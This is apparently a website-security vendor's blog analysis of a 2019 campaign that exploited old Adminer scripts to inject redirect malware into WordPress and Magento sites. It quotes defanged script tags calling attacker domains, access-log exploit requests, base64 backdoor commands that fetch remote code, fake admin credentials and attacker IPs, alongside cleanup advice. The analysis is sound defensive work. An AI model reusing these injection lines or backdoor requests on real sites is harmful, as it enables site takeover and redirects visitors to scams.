@@ -1,0 +1,112 @@
+Vulnerable Versions of Adminer as a Universal Infection Vector
+
+This past week, we’ve been monitoring a new wave of website infections mostly impacting WordPress and Magento websites. We found that hackers have been injecting scripts from scripts.trasnaltemyrecords[.]com into multiple files and database tables.
+This is still the same ongoing campaign that we’ve been following for the past few years, where site visitors are redirected to various kinds of scam landing pages—including tech support scams, fake lottery wins, and malicious browser notifications.
+Browse push notification scam landing page
+This time, however, we’re seeing some new injection patterns and infection vectors for this campaign.
+Injections in PHP files
+You can typically find the following malware script injected into the header.php, footer.php and functions.php files of active WordPress themes.
+<script  type='text/javascript' src='hxxps://scripts.trasnaltemyrecords[.]com/pixel.js?track=r&subid=875'></script>
+For index.php files, injected URLs end with “?track=c&subid=009”.
+This script loads another script from hxxps://withbestwishesjanny[.]info/5yX3Lr, which redirects visitors to scam sites via constantly changing URLs like hxxps://red.toupandgoforward[.]com/f.php?…, hxxps://ticker.trasnaltemyrecords[.]com/cron.php?… etc.Injections in JS files
+Cleaning a few .php files is a relatively minor problem in comparison to mitigating the damage when hackers inject this obfuscated script beginning with var gdjfgjfgj235f = 1; into every single .js file on the server.
+A typical WordPress site has hundreds of JavaScript files, making manual cleanup a daunting task for this particular infection.
+Malware injected into .js files
+The obfuscated part of this code loads a script from hxxps://scripts.trasnaltemyrecords[.]com/talk.js?track=r&subid=060, which in turn loads the familiar hxxps://withbestwishesjanny[.]info/5yX3Lr?dacota=1 script.
+On November 7th alone—the day after this new infection wave began—we removed this malware from over 50,000 JavaScript files on infected sites.
+Injections in Databases
+If cleaning hundreds of infected JS files isn’t enough for you, hackers are also leaving other presents in the form of infected databases. Depending on the CMS, there can be injections into different tables.
+In WordPress, hackers are injecting the following script into every post in the wp-posts table.
+<script src='hxxps://scripts.trasnaltemyrecords[.]com/pixel.js?track=r&subid=043' type='text/javascript'></script>
+Fake WordPress Admins
+As usual, simply injecting malicious code is not enough for these hackers. They want to retain access to compromised site or create more convenient ways to work with them than the original security hole they exploited—and this is accomplished by planting backdoors on compromised websites.
+In the case of this attack, we usually find new malicious WordPress admin users added to the wp_users table of the database. These fake admins help the attackers maintain unauthorized access to the compromised environments and make certain changes that require administrator permissions
+Credentials have included:
+Username: wordpresdadmin
+Email: scored@r.balantfromsun[.]com
+This balantfromsun[.]com domain was also used back in October during the previous wave of this malware campaign.
+Another user found on compromised sites—and potentially unrelated to this wave—is serveradmin, with the email address testing@gmail.com.
+Fake Super Socialat Plugin
+To obtain universal access and manipulate files across the website, attackers are installing a fake Super Socialat plugin.
+Fake Super Socialat plugin
+This plugin allows attackers to execute arbitrary PHP code, which is passed in the d1 parameter of HTTP requests.
+That being said, this malicious plugin is not new. We have regularly found it on infected sites this year. However, on November 6th, 2019 we detected an increase in the number of malicious wp-content/plugins/super-socialat/super_socialat.php files—the day of the new infection wave.
+Automated Scans for Adminer Scripts
+Initially, the infection vector for this wave was not clear. A few hours into our investigation, we were contacted by a user with the nickname “darkroom”, who shared some insights from their discussions with hosting providers. They also revealed some of their findings obtained from the access logs of compromised sites. Our colleague Ben Martin was able to validate this information from logs obtained on other compromised sites.
+According to our sources, hosting providers had begun registering an increased number of automated scans for old vulnerable versions of Adminer, a popular mySQL management tool.
+Adminer Vulnerability Exploits
+Many webmasters legitimately use Adminer to work with databases—the issue lies in when they leave these scripts publicly accessible afterwards.
+As discussed on our blog over two years ago, hackers are interested in Adminer versions below 4.6.3, which contain a security hole that allowing them to read files on servers using the LOAD DATA LOCAL INFILE statement.
+To exploit this vulnerability, hackers need to find Adminer files—usually left in the site root directory with obvious names such as adminer.php, adminer-4.2.5.php, adminer-4.3.0-mysql-en.php, etc.—and use it to connect to a database on their own remote server, instead of the site’s local database.
+Once a connection is established, attackers can query the content of local files on the server where the Adminer works. Typically, Adminer is used to read the contents of wp-config.php and other CMS configuration files that store database credentials. For example,  local.xml on Magento, or configuration.php on Joomla CMS’. Hackers can then use the credentials found in these compromised config files to connect to and modify the site’s local database.
+It turns out that the compromised site our intel source “darkroom” had worked with had an adminer.php script left in the site’s root directory. This was also true for the rest of the compromised sites we reviewed logs from.
+Adminer login page
+Attack Timeline
+Note: The following timeline is based on logs from three different sites. Not all attack stages were completed on each individual website. We’ve tried to clearly demonstrate the entire attack scenario, including all possible stages. Nonetheless, the dates, filenames, user-agents, and attack IPs on each site were identical.
+During the entire month of October, all of the logs revealed that sites had been probed for the Adminer script—and version—from multiple different IPs.
+Eventually, on November 4th, the attackers started to exploit the vulnerability:
+185.183.98.30 - - [04/Nov/2019:10:55:18 -0500] "POST /adminer.php?server=<remote-server.com.br>&username=root&db=mysql&sql= HTTP/1.0" 200 7648 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.143 Safari/537.36"
+...
+This request connects to a remote server from adminer.php on a compromised site.
+At this point, hackers exploit Adminer’s security flaw to steal WordPress database credentials from the wp-config.php file.
+On November 6th, they use these stolen credentials to connect to the site’s database from the same Adminer script.
+185.212.128.231 - - [06/Nov/2019:12:01:05 -0500] "GET /adminer.php?username=<local-db-user>&&sql= HTTP/1.0" 200 2349 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.143 Safari/537.36"
+
+185.212.128.231 - - [06/Nov/2019:12:01:05 -0500] "POST /adminer.php?username=<local-db-user>&&sql= HTTP/1.0" 200 3071 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.143 Safari/537.36"
+...
+Their requests inject “scripts.trasnaltemyrecords[.]com/pixel.js” (and its variants) into every post in the wp-posts table.
+Most likely, attackers also added a fake WordPress admin user directly into the database and used it to install the fake Super Socialat plugin. On some sites, they added malware into theme files using a theme editor.
+
+185.212.128.231 - - [06/Nov/2019:12:01:09 -0500] "POST /wp-login.php HTTP/1.0" 200 2826 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.143 Safari/537.36"
+…
+185.212.128.231 - - [06/Nov/2019:12:01:14 -0500] "GET /wp-admin/theme-editor.php?file=header.php&theme=<active-theme> HTTP/1.0" 200 40206 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.143 Safari/537.36"
+185.212.128.231 - - [06/Nov/2019:12:01:16 -0500] "POST /wp-admin/admin-ajax.php HTTP/1.0" 200 765 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.143 Safari/537.36"
+…
+185.212.128.231 - - [06/Nov/2019:12:01:20 -0500] "GET /wp-admin/theme-editor.php?file=footer.php&theme=<active-theme> HTTP/1.0" 200 38756 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.143 Safari/537.36"
+…
+185.212.128.231 - - [06/Nov/2019:12:01:26 -0500] "GET /wp-admin/theme-editor.php?file=functions.php&theme=<active-theme> HTTP/1.0" 200 41429 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.143 Safari/537.36"
+Shortly after they begin their attack, they reach the plugin to test that it had been correctly installed.
+
+185.212.128.232 - - [06/Nov/2019:14:08:30 -0600] "GET /wp-content/plugins/super-socialat/super_socialat.php?d1=ZWNobyAibGFkeWdhZ2F5Ijs= HTTP/1.1" 200 9 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.143 Safari/537.36"
+The “ZWNobyAibGFkeWdhZ2F5Ijs=” value of the “d1” parameter decodes to:
+echo "ladygagay";
+This verifies that the backdoor has been successfully installed. If the server responds with “ladygagay“, then the backdoor can be used to upload more malware and infect other files.
+In another variation of this plugin status check attackers sent “ZGllKG1kNSgzNDM0KSk7” in the d1 parameter, which decodes to “die(md5(3434));”. If successful, it returns “14c879f3f5d8ed93a09f6090d77c2cc3”.
+In a few hours, the next stage of the attack began:
+185.212.128.231 - - [06/Nov/2019:17:59:55 -0600] "GET /wp-content/plugins/super-socialat/super_socialat.php?ptz=/..&q=JGMxI...skipped...KSk7&d1=JGMxID0gImh...skipped...EpKSk7 HTTP/1.1" 200 - "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.143 Safari/537.36"
+The payload in the “d1” parameter of this request is a command to execute the content of the hxxps://todo.balantfromsun[.]com/m/b6 URL. The balantfromsun[.]com domain belongs to the same malware campaign which we found actively used in injections a few weeks ago.
+The hxxps://todo.balantfromsun[.]com/m/b6 URL contains PHP code that injects hxxps://scripts.trasnaltemyrecords[.]com/talk.js to the top of all index.php files on the compromised website.
+b6 malware injector
+B6 is not the only URL on that server that hackers use in this attack. For example, b5 has a slightly different variation of the same code that injects the malicious script with “track=r&subid=547” parameters and b1 is found to inject the hxxps://scripts.trasnaltemyrecords[.]com/talk.js?track=r&subid=060 at the top of all .js files.
+B1 injects malware into .js files
+B4 searches for files that contain “head” in their filename (like header.php) and injects the malicious script right after the opening <head> tag and right before the closing </head> tag.
+Most likely, this is an older version of the payload; it’s using the “hxxps://dns.balantfromsun[.]com/tow/” URL that we observed in infections a few weeks ago.
+Backdoor From Pastebin
+In an hour and a half, the attackers used another interesting payload.
+185.212.128.232 - - [06/Nov/2019:19:36:03 -0600] "GET /wp-content/plugins/super-socialat/super_socialat.php?d1=JGEgPSAn...skipped...aygkYSk7 HTTP/1.1" 200 - "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.143 Safari/537.36"
+In this case, the code is loaded and executed from hxxps://pastebin[.]com/raw/EU1MdPcm.
+This paste was created on November 6th, 2019 and three days later (at the time of writing) has 3,112 views.
+Code in hxxps://pastebin[.]com/raw/EU1MdPcmThis code is a universal backdoor that allows attackers to execute PHP code that is passed in encrypted form in cookies and POST parameters with the following names “jweyc“,”aeskoly“,”owhggiku“,”callbrhy“.
+The campaign has been using variations of this backdoor for quite some time. You can find references to it in our previous blog posts on November 2018 and July 2019.
+Attacker’s IPs
+The IPs used in the active phases of the attack are:
+
+185.141.27.209 – Netherlands Amsterdam Host Sailor Ltd.
+185.183.98.30 – Netherlands, Amsterdam, Host Sailor Ltd
+185.212.128.231 – Netherlands Amsterdam Internet It Company Inc
+185.212.128.232 – Netherlands Amsterdam Internet It Company Inc
+185.212.129.75 – Netherlands Amsterdam Internet It Company Inc
+
+The last three IP addresses are associated with these host names: vabicabe.ptr1[.]ru, vabicabe2.ptr1[.]ru, and vabicabe4.ptr1.ru.
+There are many other subdomains of ptr1[.]ru which are pointing to IPs on the same network in the Netherlands. Some of them have been reported for spam and brute force attacks, while others were found in previous waves of this very campaign to log into WordPress using a fake admin user “devidpentesting99“.
+Adminer as a CMS Agnostic Attack Vector
+Given the nature of this malware campaign—which actively exploits multiple new and old vulnerabilities—we can’t vouch that the vulnerability in Adminer was the only attack vector used in the trasnaltemyrecords[.]com injections this past week. But, as the logs from three unrelated sites show, it was definitely used by the attackers. Moreover, we managed to find leftover Adminer scripts on some other infected sites that we discovered in the wild.
+During our investigations, we also found infected Magento sites—typically not attacked by this campaign. However, since the Adminer vulnerability allows bad actors to attack any CMS that uses a mySQL database, it’s natural to see non-WordPress sites infected. Magento attacks using this vector had been reported in the beginning of this year.
+Conclusion & Mitigation Steps
+This post shows how an unattended script left by a webmaster can lead to a very nasty website multi-level hack with hundreds of infected files and database records, fake admins, and fake plugins.
+If you perform maintenance tasks on your site using a third-party tool, make sure this tool is not publicly accessible and delete it as soon as you finish working with it. You never know what sorts of vulnerabilities it might have, and you need to narrow down the attack surface as much as possible.
+If this has already happened to you, start the cleanup by removing the Adminer script. Then, change the database password. This is a required step—at this point, hackers already know your database credentials and can reuse them again.
+The next step is to delete the fake Super Socialat plugin. Then review and remove all unwanted WordPress admin users. Change your WordPress password, too.
+Now that hackers can’t access your site, remove the injected code from all .php, .js, and .html files. Then scan your database for malicious injections and remove them.
+Ironically, one of the ways to do this is by using the Adminer tool. If you decide to use it, make sure it’s the latest version, use a hard-to-guess filename for it, and remove it immediately after cleanup.
+If your website has been targeted by this latest infection wave and you need a hand removing the malware, we’re here to help.
